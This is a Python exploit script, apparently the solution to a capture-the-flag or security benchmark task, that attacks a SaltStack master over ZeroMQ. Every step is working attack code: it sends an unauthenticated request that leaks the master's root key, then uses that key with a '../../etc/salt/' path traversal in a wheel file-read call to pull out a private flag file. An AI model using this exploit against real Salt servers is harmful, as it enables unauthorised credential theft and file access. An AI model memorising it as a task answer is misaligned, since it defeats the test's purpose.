#!/usr/bin/env python3
"""Read a private master file through Salt's wheel path traversal."""

import importlib
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile
import urllib.parse


FLAG_PATH = "/etc/salt/saltstack-002-private-flag"
TRAVERSAL_PATH = "../../etc/salt/saltstack-002-private-flag"


def load_client_modules() -> tuple[object, object]:
    try:
        return importlib.import_module("zmq"), importlib.import_module("msgpack")
    except ImportError:
        directory = Path(tempfile.mkdtemp(prefix="saltstack-002-client-"))
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "--disable-pip-version-check",
             "--no-cache-dir", "--quiet", "--target", str(directory),
             "pyzmq==27.1.0", "msgpack==1.1.1"],
            check=True,
            stdout=subprocess.DEVNULL,
        )
        sys.path.insert(0, str(directory))
        return importlib.import_module("zmq"), importlib.import_module("msgpack")


def send_clear_request(endpoint: str, load: dict, zmq: object,
                       msgpack: object) -> object:
    context = zmq.Context.instance()
    connection = context.socket(zmq.REQ)
    connection.setsockopt(zmq.RCVTIMEO, 30000)
    connection.setsockopt(zmq.SNDTIMEO, 30000)
    connection.connect(endpoint)
    try:
        connection.send(msgpack.packb({"enc": "clear", "load": load},
                                      use_bin_type=False))
        return msgpack.unpackb(connection.recv(), raw=False)
    finally:
        connection.close()


def read_private_content(reply: object) -> str:
    if not isinstance(reply, dict):
        raise RuntimeError("Salt did not return a wheel result")
    data = reply.get("data")
    if not isinstance(data, dict) or data.get("success") is not True:
        raise RuntimeError("Salt rejected the file read")
    entries = data.get("return")
    if not isinstance(entries, list) or len(entries) != 1:
        raise RuntimeError("Salt returned no file contents")
    entry = entries[0]
    if not isinstance(entry, dict) or len(entry) != 1:
        raise RuntimeError("Salt returned an unexpected file result")
    content = next(iter(entry.values()))
    if not isinstance(content, str) or not content.startswith("jaylbreak.win{"):
        raise RuntimeError("Salt did not return the private file flag")
    return content


def main() -> None:
    target = urllib.parse.urlsplit(os.environ["REMOTE_TARGET_URL"])
    if not target.hostname:
        raise RuntimeError("target URL lacks a host")
    endpoint = f"tcp://{target.hostname}:{target.port or 80}"
    zmq, msgpack = load_client_modules()
    auth_info = send_clear_request(endpoint, {"cmd": "_prep_auth_info"},
                                   zmq, msgpack)
    if not (isinstance(auth_info, list) and len(auth_info) > 2
            and isinstance(auth_info[2], dict) and len(auth_info[2]) == 1):
        raise RuntimeError("Salt did not disclose its master key")
    root_key = next(iter(auth_info[2].values()))
    reply = send_clear_request(endpoint, {
        "key": root_key,
        "cmd": "wheel",
        "fun": "file_roots.read",
        "path": TRAVERSAL_PATH,
        "saltenv": "base",
    }, zmq, msgpack)
    content = read_private_content(reply)
    print(json.dumps({"evidence_payload": {"flag_path": FLAG_PATH,
                                           "content": content}}))


if __name__ == "__main__":
    main()
